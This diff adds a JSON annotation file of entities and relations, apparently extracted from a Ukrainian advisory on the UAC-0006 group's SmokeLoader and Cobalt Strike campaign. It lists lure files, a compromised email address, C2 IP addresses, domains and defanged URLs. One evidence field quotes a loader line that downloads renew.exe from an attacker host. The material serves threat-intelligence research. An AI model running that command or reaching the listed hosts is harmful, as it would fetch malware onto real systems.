@@ -1,0 +1,212 @@
+{
+  "entities": [
+    {
+      "name": "SmokeLoader",
+      "kind": "malware",
+      "gloss": "A modular malicious software family primarily used as a downloader for additional payloads."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware",
+      "gloss": "The payload component of the Cobalt Strike framework used for post-exploitation and command execution."
+    },
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cyber threat group known for distributing SmokeLoader to steal financial credentials."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software product",
+      "gloss": "An automation technology for Microsoft Windows operating systems that provides scripting capabilities."
+    },
+    {
+      "name": "wscript.exe",
+      "kind": "software product",
+      "gloss": "A Windows executable used to execute scripts written in VBScript or JScript."
+    },
+    {
+      "name": "cscript.exe",
+      "kind": "software product",
+      "gloss": "A command-line version of the Windows Script Host executable."
+    },
+    {
+      "name": "Заява шахрайська операція СІРІОН.scr",
+      "kind": "malware",
+      "gloss": "A malicious executable screensaver file containing Cobalt Strike Beacon."
+    },
+    {
+      "name": "smoke.exe",
+      "kind": "malware",
+      "gloss": "A malicious executable file delivering the SmokeLoader payload."
+    },
+    {
+      "name": "renew.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable downloaded during the SmokeLoader infection chain."
+    },
+    {
+      "name": "акт_звірки_та_рахунки.html",
+      "kind": "computer file",
+      "gloss": "A malicious HTML file used as an initial lure in the infection chain."
+    },
+    {
+      "name": "акт_звірки_та_рахунки.zip",
+      "kind": "computer file",
+      "gloss": "A malicious ZIP archive used in the SmokeLoader delivery chain."
+    },
+    {
+      "name": "рахунок_№415_2023.js",
+      "kind": "computer file",
+      "gloss": "A malicious JavaScript loader script executing downstream payloads."
+    },
+    {
+      "name": "акт_звірки_рахунки.zip",
+      "kind": "computer file",
+      "gloss": "A malicious archive file containing loader components."
+    },
+    {
+      "name": "Акти_та_рахунки.rar",
+      "kind": "computer file",
+      "gloss": "A malicious RAR archive containing disk images in the infection chain."
+    },
+    {
+      "name": "Акти_та_рахунки.vhd",
+      "kind": "computer file",
+      "gloss": "A virtual hard disk image file containing malicious scripts."
+    },
+    {
+      "name": "Акри та рахунки.rar",
+      "kind": "computer file",
+      "gloss": "A malicious RAR archive distributing VHDX image files."
+    },
+    {
+      "name": "Акри та рахунки.vhdx",
+      "kind": "computer file",
+      "gloss": "A virtual hard disk image file containing malicious scripts and payloads."
+    },
+    {
+      "name": "viktor@promarma.com.ua",
+      "kind": "email address",
+      "gloss": "A compromised legitimate email address used to distribute malicious emails."
+    },
+    {
+      "name": "176.124.193.111",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "193.106.174.215",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "23.230.13.93",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious command and control infrastructure."
+    },
+    {
+      "name": "77.232.37.148",
+      "kind": "ip address",
+      "gloss": "An IP address associated with threat actor infrastructure."
+    },
+    {
+      "name": "93.185.166.142",
+      "kind": "ip address",
+      "gloss": "An IP address used to host malicious scripts and receive submitted data."
+    },
+    {
+      "name": "lamazone.site",
+      "kind": "domain name",
+      "gloss": "A domain name used as part of the botnet command and control infrastructure."
+    },
+    {
+      "name": "polinamailserverip.ru",
+      "kind": "domain name",
+      "gloss": "A domain name used for botnet command and control operations."
+    },
+    {
+      "name": "premiumjeck.site",
+      "kind": "domain name",
+      "gloss": "A domain name used to host malicious executables in the campaign."
+    },
+    {
+      "name": "hxxp://premiumjeck[.]site/one/renew.exe",
+      "kind": "uniform resource locator",
+      "gloss": "A URL used to download the malicious executable renew.exe."
+    },
+    {
+      "name": "hXXp://93[.]185.166.142/en_US/all.js",
+      "kind": "uniform resource locator",
+      "gloss": "A URL hosting a malicious JavaScript payload."
+    },
+    {
+      "name": "hXXp://93[.]185.166.142/submit.php",
+      "kind": "uniform resource locator",
+      "gloss": "A URL used as a command and control endpoint for data submission."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "uses",
+      "tail": "SmokeLoader",
+      "evidence": "змін в тактиках, техніках і процедурах UAC-0006: розповсюджуваний зразок SmokeLoader"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "виявлення шкідливої програми Cobalt Strike Beacon може свідчити про розширення переліку використовуваного угрупуванням інструментарію"
+    },
+    {
+      "head": "hxxp://premiumjeck[.]site/one/renew.exe",
+      "type": "delivers",
+      "tail": "renew.exe",
+      "evidence": "$var.downloadfile('hxxp://premiumjeck[.]site/one/renew.exe','%temp%uwN57.exe')"
+    },
+    {
+      "head": "premiumjeck.site",
+      "type": "hosts",
+      "tail": "hxxp://premiumjeck[.]site/one/renew.exe",
+      "evidence": "downloadfile('hxxp://premiumjeck[.]site/one/renew.exe'"
+    },
+    {
+      "head": "93.185.166.142",
+      "type": "hosts",
+      "tail": "hXXp://93[.]185.166.142/en_US/all.js",
+      "evidence": "hXXp://93[.]185.166.142/en_US/all[.]js"
+    },
+    {
+      "head": "93.185.166.142",
+      "type": "hosts",
+      "tail": "hXXp://93[.]185.166.142/submit.php",
+      "evidence": "hXXp://93[.]185.166.142/submit[.]php"
+    },
+    {
+      "head": "Акри та рахунки.vhdx",
+      "type": "delivers",
+      "tail": "Заява шахрайська операція СІРІОН.scr",
+      "evidence": "в одному з VHDX-файлів (серед видалених файлів) виявлено виконуваний файл \"Заява шахрайська операція СІРІОН.scr\""
+    },
+    {
+      "head": "Заява шахрайська операція СІРІОН.scr",
+      "type": "delivers",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "\"Заява шахрайська операція СІРІОН.scr\" (MD5: c901c23016390f8edb3799b5f1b98e2c), що є шкідливою програмою Cobalt Strike Beacon"
+    },
+    {
+      "head": "smoke.exe",
+      "type": "delivers",
+      "tail": "SmokeLoader",
+      "evidence": "smoke.exe (SmokeLoader)"
+    },
+    {
+      "head": "рахунок_№415_2023.js",
+      "type": "delivers",
+      "tail": "renew.exe",
+      "evidence": "JavaScript (завантажувач) -> EXE -> SmokeLoader"
+    }
+  ],
+  "newRelationTypes": []
+}
